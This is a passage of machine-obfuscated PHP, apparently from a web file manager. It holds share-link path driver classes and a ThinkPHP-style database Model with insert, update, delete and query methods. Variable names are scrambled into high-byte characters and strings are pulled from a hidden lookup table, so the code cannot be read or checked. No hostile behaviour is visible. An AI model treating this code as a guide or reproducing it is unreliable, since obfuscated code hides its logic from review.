$_SERVER[¹ş¤¶ĞÖ]; $ŠÛÁ§ºë = KodIO::parse($Ğ“ß‡¡ë); if ($ŠÛÁ§ºë[$ÛíîÁÂ¬[33]] == KodIO::KOD_SHARE_ITEM) { return $ŠÛÁ§ºë[$ÛíîÁÂ¬[84]]; } $ÊÚâ¯ê = KodIO::clear($Ğ“ß‡¡ë); $ƒÒø£ì¶ = KodIO::clear($this->pathParse[$ÛíîÁÂ¬[515]][$ÛíîÁÂ¬[1208]]); $â¦ ıÅı = substr($ÊÚâ¯ê, strlen($ƒÒø£ì¶)); if (substr($ÊÚâ¯ê, 0, strlen($ƒÒø£ì¶)) != $ƒÒø£ì¶) { return !1; } return $this->pathParse[$ÛíîÁÂ¬[1202]] . $ÛíîÁÂ¬[8] . ltrim($â¦ ıÅı, $ÛíîÁÂ¬[8]); } public function getType() { $¡ŸñÅĞ =& $_SERVER[¹ş¤¶ĞÖ]; $Şº’öÉ = str_replace($¡ŸñÅĞ[74], $¡ŸñÅĞ[12], get_class($this)); return strtolower($Şº’öÉ); } public function isTypeObject($øêšÛŞ) { return IO::isTypeObject($øêšÛŞ); } public function info($Ø´×ÃÉ©) { return $this->infoParse($Ø´×ÃÉ©); } public function infoAuth($ÄÕŠš­É) { return $this->infoParse($ÄÕŠš­É); } public function infoWithChildren($èæßÌã±) { return $this->infoParse($èæßÌã±, !0); } public function infoFull($ÏŒš÷Ğò) { return $this->infoParse($ÏŒš÷Ğò); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($±Èãß¾î) { $this->pathParse = $±Èãß¾î; } protected function infoParse($š€‘Íğ…, $¸Šİï—’ = false) { $Ğì†Õ²„ =& $_SERVER[¹ş¤¶ĞÖ]; return Action($Ğì†Õ²„[1207])->sharePathInfo($this->pathParse[$Ğì†Õ²„[84]], !0, $¸Šİï—’); } public function listPath($×ôë§†¼, $¸¬ÚÑÑ = false) { $½ŞãØ€  =& $_SERVER[¹ş¤¶ĞÖ]; $Ò¸¿¼ = IO::listPath($×ôë§†¼, $¸¬ÚÑÑ); if (!$Ò¸¿¼) { return $Ò¸¿¼; } if (is_array($Ò¸¿¼[$½ŞãØ€ [1375]])) { $ü©Šíæ¦ = Action($½ŞãØ€ [1384])->parsePathChildren($Ò¸¿¼[$½ŞãØ€ [1375]], array($½ŞãØ€ [450] => $×ôë§†¼)); $Ò¸¿¼[$½ŞãØ€ [1375]] = Action($½ŞãØ€ [1207])->shareItemInfo($ü©Šíæ¦); } foreach ($Ò¸¿¼ as $˜Å€‹˜š => $‰§¦÷Èò) { if (!in_array($˜Å€‹˜š, array($½ŞãØ€ [83], $½ŞãØ€ [82]))) { continue; } foreach ($‰§¦÷Èò as $˜´±™… => $ü©Šíæ¦) { $ü©Šíæ¦ = Action($½ŞãØ€ [1384])->parsePathChildren($ü©Šíæ¦, array($½ŞãØ€ [450] => $×ôë§†¼)); $Ò¸¿¼[$˜Å€‹˜š][$˜´±™…] = Action($½ŞãØ€ [1207])->shareItemInfo($ü©Šíæ¦); } } return $Ò¸¿¼; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ä±à´) { parent::__construct($ä±à´); } } goto cØáØ¶ƒ; C‰ÂÊˆâÊ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\x6f\162\x64\145\162", "\x61\154\151\x61\x73", "\150\x61\166\x69\x6e\147", "\147\162\157\165\160", "\154\x6f\143\153", "\x64\151\x73\x74\x69\x6e\x63\x74", "\141\x75\164\157", "\146\x69\154\164\x65\x72", "\x76\141\x6c\x69\x64\141\x74\x65", "\162\145\x73\165\154\164", "\x62\x69\x6e\x64", "\x74\x6f\153\145\156"); public function __construct($©´Ì¾± = '', $Ş¢ªˆ² = '', $Áì¥—ğ = '') { $Ğ×Š·× =& $_SERVER[¹ş¤¶ĞÖ]; $this->_initialize(); if (!empty($©´Ì¾±)) { if (strpos($©´Ì¾±, $Ğ×Š·×[10])) { list($this->dbName, $this->name) = explode($Ğ×Š·×[10], $©´Ì¾±); } else { $this->name = $©´Ì¾±; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ş¢ªˆ²)) { $this->tablePrefix = $Ğ×Š·×[12]; } elseif ($Ğ×Š·×[12] != $Ş¢ªˆ²) { $this->tablePrefix = $Ş¢ªˆ²; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ğ×Š·×[273]); } $this->db(0, empty($this->connection) ? $Áì¥—ğ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ùë–·åâ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($this->fields)) { if (think_config($ùë–·åâ[274])) { $í±°¹ûÓ = $this->dbName ? $this->dbName : think_config($ùë–·åâ[275]); $¨šûìò¼ = think_var_cache($ùë–·åâ[276] . strtolower(get_path_this($í±°¹ûÓ) . $ùë–·åâ[10] . $this->name)); if ($¨šûìò¼) { $³„úÃßÇ = think_config($ùë–·åâ[277]); if (empty($³„úÃßÇ) || $¨šûìò¼[$ùë–·åâ[278]] == $³„úÃßÇ) { $this->fields = $¨šûìò¼; return; } } } $this->flush(); } } public function flush() { $œ°—÷÷± =& $_SERVER[¹ş¤¶ĞÖ]; $this->db->setModel($this->name); $÷¸‚×Ûƒ = $this->db->getFields($this->getTableName()); if (!$÷¸‚×Ûƒ) { return !1; } $this->fields = array_keys($÷¸‚×Ûƒ); $this->fields[$œ°—÷÷±[279]] = !1; foreach ($÷¸‚×Ûƒ as $È™‘ñÌ => $Ó³á¡ç) { $°Ù£à©í[$È™‘ñÌ] = $Ó³á¡ç[$œ°—÷÷±[33]]; if ($Ó³á¡ç[$œ°—÷÷±[39]]) { $this->fields[$œ°—÷÷±[280]] = $È™‘ñÌ; if ($Ó³á¡ç[$œ°—÷÷±[42]]) { $this->fields[$œ°—÷÷±[279]] = !0; } } } $this->fields[$œ°—÷÷±[281]] = $°Ù£à©í; if (think_config($œ°—÷÷±[277])) { $this->fields[$œ°—÷÷±[278]] = think_config($œ°—÷÷±[277]); } if (think_config($œ°—÷÷±[274])) { $Ï¥Òˆëé = $this->dbName ? $this->dbName : think_config($œ°—÷÷±[275]); think_var_cache($œ°—÷÷±[276] . strtolower(get_path_this($Ï¥Òˆëé) . $œ°—÷÷±[10] . $this->name), $this->fields); } } public function switchModel($„ÎøÎ¡°, $éÅÊ„èŞ = array()) { $®ş“¿ÑË =& $_SERVER[¹ş¤¶ĞÖ]; $ı·Ü¾ª = ucwords(strtolower($„ÎøÎ¡°)) . $®ş“¿ÑË[282]; if (!class_exists($ı·Ü¾ª)) { think_exception($ı·Ü¾ª . think_lang($®ş“¿ÑË[283])); } $this->_extModel = new $ı·Ü¾ª($this->name); if (!empty($éÅÊ„èŞ)) { foreach ($éÅÊ„èŞ as $ê‹´¶²ş) { $this->_extModel->setProperty($ê‹´¶²ş, $this->{$ê‹´¶²ş}); } } return $this->_extModel; } public function __set($¦ïÜÑ©±, $ßßÜõî†) { $this->data[$¦ïÜÑ©±] = $ßßÜõî†; } public function __get($¬Æ”Ê’) { return isset($this->data[$¬Æ”Ê’]) ? $this->data[$¬Æ”Ê’] : null; } public function __isset($ú³›ã™¡) { return isset($this->data[$ú³›ã™¡]); } public function __unset($ğ¼¢¢†ğ) { unset($this->data[$ğ¼¢¢†ğ]); } public function __call($¿×ÀŒ‹™, $æááÚï§) { $ĞÀ—«Üõ =& $_SERVER[¹ş¤¶ĞÖ]; if (in_array(strtolower($¿×ÀŒ‹™), $this->methods, !0)) { $this->options[strtolower($¿×ÀŒ‹™)] = $æááÚï§[0]; return $this; } elseif (in_array(strtolower($¿×ÀŒ‹™), array($ĞÀ—«Üõ[284], $ĞÀ—«Üõ[285], $ĞÀ—«Üõ[286], $ĞÀ—«Üõ[287], $ĞÀ—«Üõ[288]), !0)) { $˜ÏœÒáŠ = isset($æááÚï§[0]) ? $æááÚï§[0] : $ĞÀ—«Üõ[189]; $˜ÏœÒáŠ = $this->db->parseKey($˜ÏœÒáŠ); return $this->getField(strtoupper($¿×ÀŒ‹™) . $ĞÀ—«Üõ[289] . $˜ÏœÒáŠ . $ĞÀ—«Üõ[290] . $¿×ÀŒ‹™, $ĞÀ—«Üõ[284]); } elseif (strtolower(substr($¿×ÀŒ‹™, 0, 5)) == $ĞÀ—«Üõ[291]) { $˜ÏœÒáŠ = think_parse_name(substr($¿×ÀŒ‹™, 5)); $Šò¶Ëñ[$˜ÏœÒáŠ] = $æááÚï§[0]; return $this->where($Šò¶Ëñ)->find(); } elseif (strtolower(substr($¿×ÀŒ‹™, 0, 10)) == $ĞÀ—«Üõ[292]) { $¦ßïŞ­â = think_parse_name(substr($¿×ÀŒ‹™, 10)); $Šò¶Ëñ[$¦ßïŞ­â] = $æááÚï§[0]; return $this->where($Šò¶Ëñ)->getField($æááÚï§[1]); } elseif (isset($this->_scope[$¿×ÀŒ‹™])) { return $this->scope($¿×ÀŒ‹™, $æááÚï§[0]); } elseif (method_exists($this, $¿×ÀŒ‹™)) { array_unshift($æááÚï§, $¿×ÀŒ‹™); return call_user_func_array(array($this, $ĞÀ—«Üõ[293]), $æááÚï§); } else { return call_user_func_array(array(parent, $¿×ÀŒ‹™), $æááÚï§); } } protected function call() { $ÏõÍÈü =& $_SERVER[¹ş¤¶ĞÖ]; $œ‘²”à· = func_get_args(); $µµïø¢Ş = array_shift($œ‘²”à·); $òìáƒ¼ğ = $µµïø¢Ş; if (is_array($µµïø¢Ş)) { $òìáƒ¼ğ = $µµïø¢Ş[1]; $µµïø¢Ş = $µµïø¢Ş[0]; } $Ğö’»ªî = count($œ‘²”à·) - 1; if (isset($œ‘²”à·[$Ğö’»ªî]) && $œ‘²”à·[$Ğö’»ªî] === $µµïø¢Ş) { think_exception(__CLASS__ . $ÏõÍÈü[4] . $µµïø¢Ş . think_lang($ÏõÍÈü[294])); return; } $œ‘²”à·[] = $µµïø¢Ş; if (method_exists($this, $ÏõÍÈü[295])) { $à±ò·°ñ = call_user_func_array(array($this, $ÏõÍÈü[296]), array($òìáƒ¼ğ, $œ‘²”à·)); if (!is_null($à±ò·°ñ) && $à±ò·°ñ !== !1) { return $à±ò·°ñ; } } $Å£‚ÑÒ’ = call_user_func_array(array($this, $µµïø¢Ş), $œ‘²”à·); if (method_exists($this, $ÏõÍÈü[297])) { $à±ò·°ñ = call_user_func_array(array($this, $ÏõÍÈü[298]), array($òìáƒ¼ğ, $œ‘²”à·, $Å£‚ÑÒ’)); if ($à±ò·°ñ) { return $à±ò·°ñ; } } return $Å£‚ÑÒ’; } protected function _initialize() { } protected function _facade($í¹­òğ) { $†Á´ƒŠÇ =& $_SERVER[¹ş¤¶ĞÖ]; if (!empty($this->fields)) { foreach ($í¹­òğ as $’ıµ“óˆ => $äÔŒ) { if (is_array($this->fields) && !in_array($’ıµ“óˆ, $this->fields, !0)) { unset($í¹­òğ[$’ıµ“óˆ]); } elseif (is_scalar($äÔŒ)) { $this->_parseType($í¹­òğ, $’ıµ“óˆ); } } } if (!empty($this->options[$†Á´ƒŠÇ[299]])) { $í¹­òğ = array_map($this->options[$†Á´ƒŠÇ[299]], $í¹­òğ); unset($this->options[$†Á´ƒŠÇ[299]]); } $this->_beforeWrite($í¹­òğ); return $í¹­òğ; } protected function _beforeWrite(&$İˆøøÍâ) { } public function add($²Ç„‘¼– = '', $ÌÕÑæ = array(), $òÑÜó“° = false) { if (empty($²Ç„‘¼–)) { if (!empty($this->data)) { $²Ç„‘¼– = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹ş¤¶ĞÖ][300]); return !1; } } $ÌÕÑæ = $this->_parseOptions($ÌÕÑæ); $²Ç„‘¼– = $this->_facade($²Ç„‘¼–); if (!1 === $this->_beforeInsert($²Ç„‘¼–, $ÌÕÑæ)) { return !1; } $–£¨ŒŞ = $this->db->insert($²Ç„‘¼–, $ÌÕÑæ, $òÑÜó“°); if (!1 !== $–£¨ŒŞ) { $¤â–Ğ¼ = $this->getLastInsID(); if ($¤â–Ğ¼) { $²Ç„‘¼–[$this->getPk()] = $¤â–Ğ¼; $this->_after_insert($²Ç„‘¼–, $ÌÕÑæ); return $¤â–Ğ¼; } $this->_after_insert($²Ç„‘¼–, $ÌÕÑæ); } return $–£¨ŒŞ; } protected function _beforeInsert(&$Ö“Ğñ­ò, $À†Åö®) { } protected function _after_insert($ËáğÄíâ, $®õÅÀ³ƒ) { } public function addAll($ƒ‰Á’É, $µ÷Şóúˆ = array(), $‰ÎÜšü“ = false) { $µ™«’Ë· =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($ƒ‰Á’É)) { $this->error = think_lang($µ™«’Ë·[300]); return !1; } $µ÷Şóúˆ = $this->_parseOptions($µ÷Şóúˆ); foreach ($ƒ‰Á’É as $ˆÅúé¸‰ => $ÂºŠˆë) { $ƒ‰Á’É[$ˆÅúé¸‰] = $this->_facade($ÂºŠˆë); } if (method_exists($this->db, $µ™«’Ë·[301])) { $ƒÌ”’ì½ = $this->db->insertAll($ƒ‰Á’É, $µ÷Şóúˆ, $‰ÎÜšü“); } else { $this->startTrans(); foreach ($ƒ‰Á’É as $ˆÅúé¸‰ => $ÂºŠˆë) { $ƒÌ”’ì½ = $this->db->insert($ÂºŠˆë, $µ÷Şóúˆ, $‰ÎÜšü“); } $this->commit(); } if (!1 !== $ƒÌ”’ì½) { $’¿ËˆæØ = $this->getLastInsID(); if ($’¿ËˆæØ) { return $’¿ËˆæØ; } } return $ƒÌ”’ì½; } public function selectAdd($§¶Åü³” = '', $ª§ÏÈ¹± = '', $ š´‹Ñ¾ = array()) { $™ÉÈÅ‹¡ =& $_SERVER[¹ş¤¶ĞÖ]; $ š´‹Ñ¾ = $this->_parseOptions($ š´‹Ñ¾); if (!1 === ($ùô‹©¢² = $this->db->selectInsert($§¶Åü³” ? $§¶Åü³” : $ š´‹Ñ¾[$™ÉÈÅ‹¡[302]], $ª§ÏÈ¹± ? $ª§ÏÈ¹± : $this->getTableName(), $ š´‹Ñ¾))) { $this->error = think_lang($™ÉÈÅ‹¡[303]); return !1; } else { return $ùô‹©¢²; } } public function save($Èß““Û¿ = '', $ƒ¸µÊ³ = array()) { $èÊèøÇí =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($Èß““Û¿)) { if (!empty($this->data)) { $Èß““Û¿ = $this->data; $this->data = array(); } else { $this->error = think_lang($èÊèøÇí[300]); return !1; } } $Èß““Û¿ = $this->_facade($Èß““Û¿); $ƒ¸µÊ³ = $this->_parseOptions($ƒ¸µÊ³); $”î´Ñ™Ë = $this->getPk(); if (!isset($ƒ¸µÊ³[$èÊèøÇí[304]])) { if (isset($Èß““Û¿[$”î´Ñ™Ë])) { $äãÌšÅÖ[$”î´Ñ™Ë] = $Èß““Û¿[$”î´Ñ™Ë]; $ƒ¸µÊ³[$èÊèøÇí[304]] = $äãÌšÅÖ; unset($Èß““Û¿[$”î´Ñ™Ë]); } else { $this->error = think_lang($èÊèøÇí[303]); return !1; } } if (is_array($ƒ¸µÊ³[$èÊèøÇí[304]]) && isset($ƒ¸µÊ³[$èÊèøÇí[304]][$”î´Ñ™Ë])) { $ïºäÚ¾ = $ƒ¸µÊ³[$èÊèøÇí[304]][$”î´Ñ™Ë]; } if (!1 === $this->_beforeUpdate($Èß““Û¿, $ƒ¸µÊ³)) { return !1; } $¡Áñø×á = $this->db->update($Èß““Û¿, $ƒ¸µÊ³); if (!1 !== $¡Áñø×á) { if (isset($ïºäÚ¾)) { $Èß““Û¿[$”î´Ñ™Ë] = $ïºäÚ¾; } $this->_afterUpdate($Èß““Û¿, $ƒ¸µÊ³); } return $¡Áñø×á; } protected function _beforeUpdate(&$Õ¥àô ƒ, $¨›‚’£) { } protected function _afterUpdate($œüËÆŠè, $ğ£µ™Î‡) { } public function delete($æ”İ›ô¹ = array()) { $­ß¸Ã™ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($æ”İ›ô¹) && empty($this->options[$­ß¸Ã™[304]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ù¾“ì¿Š = $this->getPk(); if (is_numeric($æ”İ›ô¹) || is_string($æ”İ›ô¹)) { if (strpos($æ”İ›ô¹, $­ß¸Ã™[50])) { $‡ä÷å¶·[$Ù¾“ì¿Š] = array($­ß¸Ã™[305], $æ”İ›ô¹); } else { $‡ä÷å¶·[$Ù¾“ì¿Š] = $æ”İ›ô¹; } $this->options[$­ß¸Ã™[304]] = $‡ä÷å¶·; } $æ”İ›ô¹ = $this->_parseOptions(); if (is_array($æ”İ›ô¹[$­ß¸Ã™[304]]) && isset($æ”İ›ô¹[$­ß¸Ã™[304]][$Ù¾“ì¿Š])) { $Ç¼ûú» = $æ”İ›ô¹[$­ß¸Ã™[304]][$Ù¾“ì¿Š]; } $¥˜õÔı• = $this->db->delete($æ”İ›ô¹); if (!1 !== $¥˜õÔı•) { $ËŠ‹†µ = array(); if (isset($Ç¼ûú»)) { $ËŠ‹†µ[$Ù¾“ì¿Š] = $Ç¼ûú»; } $this->_after_delete($ËŠ‹†µ, $æ”İ›ô¹); } return $¥˜õÔı•; } protected function _after_delete($ÈÄƒÈ‡ˆ, $¡¡‡©ºŠ) { } public function select($«îğŒÊ = array()) { $Û­ÇŒª =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($«îğŒÊ) || is_numeric($«îğŒÊ)) { $›ºššëŠ = $this->getPk(); if (strpos($«îğŒÊ, $Û­ÇŒª[50])) { $ÙèÆƒ¯ğ[$›ºššëŠ] = array($Û­ÇŒª[305], $«îğŒÊ); } else { $ÙèÆƒ¯ğ[$›ºššëŠ] = $«îğŒÊ; } $this->options[$Û­ÇŒª[304]] = $ÙèÆƒ¯ğ; } elseif (!1 === $«îğŒÊ) { $«îğŒÊ = $this->_parseOptions(); return $Û­ÇŒª[306] . $this->db->buildSelectSql($«îğŒÊ) . $Û­ÇŒª[307]; } $«îğŒÊ = $this->_parseOptions(); $‘ã£­§“ = $this->db->select($«îğŒÊ); if (!1 === $‘ã£­§“) { return !1; } if (empty($‘ã£­§“)) { return null; } $this->_afterSelect($‘ã£­§“, $«îğŒÊ); return $‘ã£­§“; } protected function _afterSelect(&$ÏÓ—Ìõ†, $ßğşÜ¾) { } public function buildSql($àªšÕÃØ = array()) { $Ôøƒ¨€¡ =& $_SERVER[¹ş¤¶ĞÖ]; $àªšÕÃØ = $this->_parseOptions($àªšÕÃØ); return $Ôøƒ¨€¡[306] . $this->db->buildSelectSql($àªšÕÃØ) . $Ôøƒ¨€¡[307]; } public function optionsValue($Ø‘„œ½˜ = null) { if (is_null($Ø‘„œ½˜)) { return $this->options; } elseif (is_array($Ø‘„œ½˜)) { $this->options = array_merge($this->options, $Ø‘„œ½˜); } } protected function _parseOptions($“á¨ÍÊ¸ = array()) { $Ññª½— =& $_SERVER[¹ş¤¶ĞÖ]; if (is_array($“á¨ÍÊ¸)) { $“á¨ÍÊ¸ = array_merge($this->options, $“á¨ÍÊ¸); } $this->options = array(); if (!isset($“á¨ÍÊ¸[$Ññª½—[308]])) { $“á¨ÍÊ¸[$Ññª½—[308]] = $this->getTableName(); $İ½î…Ïè = $this->fields; } else { $İ½î…Ïè = $this->getDbFields(); } if (!empty($“á¨ÍÊ¸[$Ññª½—[309]])) { $“á¨ÍÊ¸[$Ññª½—[308]] .= $Ññª½—[53] . $“á¨ÍÊ¸[$Ññª½—[309]]; } $“á¨ÍÊ¸[$Ññª½—[310]] = $this->name; if (isset($“á¨ÍÊ¸[$Ññª½—[304]]) && is_array($“á¨ÍÊ¸[$Ññª½—[304]]) && !empty($İ½î…Ïè) && !isset($“á¨ÍÊ¸[$Ññª½—[311]]) && !isset($“á¨ÍÊ¸[$Ññª½—[308]])) { foreach ($“á¨ÍÊ¸[$Ññª½—[304]] as $¡…ÅúĞÔ => $ñ„ôÔ§) { $¡…ÅúĞÔ = trim($¡…ÅúĞÔ); if (in_array($¡…ÅúĞÔ, $İ½î…Ïè, !0)) { if (is_scalar($ñ„ôÔ§)) { $this->_parseType($“á¨ÍÊ¸[$Ññª½—[304]], $¡…ÅúĞÔ); } } elseif (!is_numeric($¡…ÅúĞÔ) && $Ññª½—[11] != substr($¡…ÅúĞÔ, 0, 1) && !1 === strpos($¡…ÅúĞÔ, $Ññª½—[10]) && !1 === strpos($¡…ÅúĞÔ, $Ññª½—[289]) && !1 === strpos($¡…ÅúĞÔ, $Ññª½—[312]) && !1 === strpos($¡…ÅúĞÔ, $Ññª½—[313])) { unset($“á¨ÍÊ¸[$Ññª½—[304]][$¡…ÅúĞÔ]); } } } $this->_options_filter($“á¨ÍÊ¸); return $“á¨ÍÊ¸; } protected function _options_filter(&$ñÌ²åøÛ) { } protected function _parseType(&$ÆÆ¯÷¤ñ, $•¹Á‰) { $´¾ˆŠ” =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($this->options[$´¾ˆŠ”[314]][$´¾ˆŠ”[4] . $•¹Á‰])) { $„Ä¢¹‡ = strtolower($this->fields[$´¾ˆŠ”[281]][$•¹Á‰]); if (!1 !== strpos($„Ä¢¹‡, $´¾ˆŠ”[315])) { } elseif (!1 === strpos($„Ä¢¹‡, $´¾ˆŠ”[316]) && !1 !== strpos($„Ä¢¹‡, $´¾ˆŠ”[317])) { $ÆÆ¯÷¤ñ[$•¹Á‰] = intval($ÆÆ¯÷¤ñ[$•¹Á‰]); } elseif (!1 !== strpos($„Ä¢¹‡, $´¾ˆŠ”[318]) || !1 !== strpos($„Ä¢¹‡, $´¾ˆŠ”[319])) { $ÆÆ¯÷¤ñ[$•¹Á‰] = floatval($ÆÆ¯÷¤ñ[$•¹Á‰]); } elseif (!1 !== strpos($„Ä¢¹‡, $´¾ˆŠ”[320])) { $ÆÆ¯÷¤ñ[$•¹Á‰] = (bool) $ÆÆ¯÷¤ñ[$•¹Á‰]; } } } public function find($çû–¿ŒÙ = array()) { $ïı¤ô¶Å =& $_SERVER[¹ş¤¶ĞÖ]; if (is_numeric($çû–¿ŒÙ) || is_string($çû–¿ŒÙ)) { $ñÒ£¨ñø[$this->getPk()] = intval($çû–¿ŒÙ); $this->options[$ïı¤ô¶Å[304]] = $ñÒ£¨ñø; } $this->options[$ïı¤ô¶Å[321]] = 1; $çû–¿ŒÙ = $this->_parseOptions(); $‹¹ÛÎÁì = $this->db->select($çû–¿ŒÙ); if (!1 === $‹¹ÛÎÁì) { return !1; } if (empty($‹¹ÛÎÁì)) { return null; } $this->data = $‹¹ÛÎÁì[0]; $this->_afterFind($this->data, $çû–¿ŒÙ); if (!empty($this->options[$ïı¤ô¶Å[322]])) { return $this->returnResult($this->data, $this->options[$ïı¤ô¶Å[322]]); } return $this->data; } protected function _afterFind(&$À¡ë¬, $ê™‡ª“Á) { } protected function returnResult($Ğ—ÄıÜµ, $­¸¹öª¬ = '') { $Ş£€Éñ¢ =& $_SERVER[¹ş¤¶ĞÖ]; if ($­¸¹öª¬) { if (is_callable($­¸¹öª¬)) { return call_user_func($­¸¹öª¬, $Ğ—ÄıÜµ); } switch (strtolower($­¸¹öª¬)) { case $Ş£€Éñ¢[323]: return json_encode($Ğ—ÄıÜµ); case $Ş£€Éñ¢[324]: return xml_encode($Ğ—ÄıÜµ); } } return $Ğ—ÄıÜµ; } public function parseFieldsMap($ØÉøø¾, $Û½Ş… = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÇéÙ¨£ => $ó‡™œâå) { if ($Û½Ş… == 1) { if (isset($ØÉøø¾[$ó‡™œâå])) { $ØÉøø¾[$ÇéÙ¨£] = $ØÉøø¾[$ó‡™œâå]; unset($ØÉøø¾[$ó‡™œâå]); } } else { if (isset($ØÉøø¾[$ÇéÙ¨£])) { $ØÉøø¾[$ó‡™œâå] = $ØÉøø¾[$ÇéÙ¨£]; unset($ØÉøø¾[$ÇéÙ¨£]); } } } } return $ØÉøø¾; } public function setField($æŸË±æÕ, $Œ¢şÃ‡‡ = '') { if (is_array($æŸË±æÕ)) { $óÊÄàüÏ = $æŸË±æÕ; } else { $óÊÄàüÏ[$æŸË±æÕ] = $Œ¢şÃ‡‡; } return $this->save($óÊÄàüÏ); } public function setAdd($ßñõóè¼, $ÛŒ‚¦Ş³ = 1) { $ôèÑ€Ÿ§ =& $_SERVER[¹ş¤¶ĞÖ]; $‹·ÒœÇ = $ßñõóè¼ . $ôèÑ€Ÿ§[325] . $ÛŒ‚¦Ş³; if ($ÛŒ‚¦Ş³ < 0) { $‹·ÒœÇ = $ßñõóè¼ . $ÛŒ‚¦Ş³; } return $this->setField($ßñõóè¼, array($ôèÑ€Ÿ§[326], $‹·ÒœÇ)); } public function getField($…Æ€ƒ´¹, $‡¥äšÙª = null) { $®­”™®÷ =& $_SERVER[¹ş¤¶ĞÖ]; $˜Äà×³ı[$®­”™®÷[302]] = $…Æ€ƒ´¹; $˜Äà×³ı = $this->_parseOptions($˜Äà×³ı); $…Æ€ƒ´¹ = trim($…Æ€ƒ´¹); if (strpos($…Æ€ƒ´¹, $®­”™®÷[50])) { if (!isset($˜Äà×³ı[$®­”™®÷[321]])) { $˜Äà×³ı[$®­”™®÷[321]] = is_numeric($‡¥äšÙª) ? $‡¥äšÙª : $®­”™®÷[12]; } $‹…ûØ±È = $this->db->select($˜Äà×³ı); if (!empty($‹…ûØ±È)) { $ê”ü€ç = explode($®­”™®÷[50], $…Æ€ƒ´¹); $…Æ€ƒ´¹ = array_keys($‹…ûØ±È[0]); $‚–ëùØ› = array_shift($…Æ€ƒ´¹); $Ó„½”ô = array_shift($…Æ€ƒ´¹); $ÕĞÜÇü = array(); $±Èéœ¥¶ = count($ê”ü€ç); foreach ($‹…ûØ±È as $¸üÌ†) { $Ú”Ú•ªæ = $¸üÌ†[$‚–ëùØ›]; if (2 == $±Èéœ¥¶) { $ÕĞÜÇü[$Ú”Ú•ªæ] = $¸üÌ†[$Ó„½”ô]; } else { $ÕĞÜÇü[$Ú”Ú•ªæ] = is_string($‡¥äšÙª) ? implode($‡¥äšÙª, $¸üÌ†) : $¸üÌ†; } } return $ÕĞÜÇü; } } else { if (!0 !== $‡¥äšÙª) { $˜Äà×³ı[$®­”™®÷[321]] = is_numeric($‡¥äšÙª) ? $‡¥äšÙª : 1; } if ($‡¥äšÙª === $®­”™®÷[284]) { unset($˜Äà×³ı[$®­”™®÷[321]]); } $¸üÌ† = $this->db->select($˜Äà×³ı); if (!empty($¸üÌ†)) { if ($‡¥äšÙª === $®­”™®÷[284]) { return reset($¸üÌ†[0]); } if (!0 !== $‡¥äšÙª && 1 == $˜Äà×³ı[$®­”™®÷[321]]) { return reset($¸üÌ†[0]); } foreach ($¸üÌ† as $ıÈŞäÈƒ) { $í‡˜¢èå[] = $ıÈŞäÈƒ[$…Æ€ƒ´¹]; } return $í‡˜¢èå; } } return null; } public function create($«ï¦ÏÔ¶ = '', $¹Ü²åÂ² = '') { $­ñ§Šüİ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($«ï¦ÏÔ¶)) { $«ï¦ÏÔ¶ = $_POST; } elseif (is_object($«ï¦ÏÔ¶)) { $«ï¦ÏÔ¶ = get_object_vars($«ï¦ÏÔ¶); } if (empty($«ï¦ÏÔ¶) || !is_array($«ï¦ÏÔ¶)) { $this->error = think_lang($­ñ§Šüİ[300]); return !1; } $«ï¦ÏÔ¶ = $this->parseFieldsMap($«ï¦ÏÔ¶, 0); $¹Ü²åÂ² = $¹Ü²åÂ² ? $¹Ü²åÂ² : (!empty($«ï¦ÏÔ¶[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$­ñ§Šüİ[302]])) { $¶¶øÒÌç = $this->options[$­ñ§Šüİ[302]]; unset($this->options[$­ñ§Šüİ[302]]); } elseif ($¹Ü²åÂ² == THINK_MODEL_INSERT && isset($this->insertFields)) { $¶¶øÒÌç = $this->insertFields; } elseif ($¹Ü²åÂ² == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¶¶øÒÌç = $this->updateFields; } if (isset($¶¶øÒÌç)) { if (is_string($¶¶øÒÌç)) { $¶¶øÒÌç = explode($­ñ§Šüİ[50], $¶¶øÒÌç); } if (think_config($­ñ§Šüİ[327])) { $¶¶øÒÌç[] = think_config($­ñ§Šüİ[328]); } foreach ($«ï¦ÏÔ¶ as $—ŞË¦Õ— => $õùâ ™Í) { if (!in_array($—ŞË¦Õ—, $¶¶øÒÌç)) { unset($«ï¦ÏÔ¶[$—ŞË¦Õ—]); } } } if (!$this->autoValidation($«ï¦ÏÔ¶, $¹Ü²åÂ²)) { return !1; } if (!$this->autoCheckToken($«ï¦ÏÔ¶)) { $this->error = think_lang($­ñ§Šüİ[329]); return !1; } if ($this->autoCheckFields) { $¶¶øÒÌç = $this->getDbFields(); foreach ($«ï¦ÏÔ¶ as $—ŞË¦Õ— => $õùâ ™Í) { if (!in_array($—ŞË¦Õ—, $¶¶øÒÌç)) { unset($«ï¦ÏÔ¶[$—ŞË¦Õ—]); } elseif (MAGIC_QUOTES_GPC && is_string($õùâ ™Í)) { $«ï¦ÏÔ¶[$—ŞË¦Õ—] = stripslashes($õùâ ™Í); } } } $this->autoOperation($«ï¦ÏÔ¶, $¹Ü²åÂ²); $this->data = $«ï¦ÏÔ¶; return $«ï¦ÏÔ¶; } public function 